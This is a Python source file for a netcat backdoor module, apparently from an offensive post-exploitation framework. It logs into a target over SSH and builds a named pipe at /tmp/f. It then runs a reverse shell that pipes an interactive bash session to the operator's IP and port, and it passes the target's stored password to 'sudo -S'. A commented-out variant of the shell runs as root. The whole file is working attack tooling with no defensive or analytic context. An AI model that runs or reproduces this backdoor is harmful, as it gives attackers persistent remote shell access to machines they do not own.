from backdoors.backdoor import *
import time

class Netcat(Backdoor):
    prompt = Fore.RED + "(nc) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using netcat backdoor..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53920, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {} 
        self.help_text = INFO + "Uses netcat to pipe standard input and output to /bin/sh, giving the user an interactive shell." 
	
    def get_command(self):
        #command = "echo " + self.core.curtarget.pword + " | sudo -S bash -c \"cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f\"" % self.get_value("port")
        command = "cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f" % self.get_value("port")
        return command
 
    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        self.listen(prompt="some")
        #input("Enter the following command in another terminal: nc -v -n -l -p %s" % port)
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command("echo " + target.pword + " | sudo -S rm /tmp/f")
        time.sleep(.5)
        target.ssh.exec_command("mkfifo /tmp/f")
        #target.ssh.exec_command("echo " + target.pword + " | sudo -S chmod 222 /tmp/f")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Netcat backdoor on port %s attempted." % port)
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()

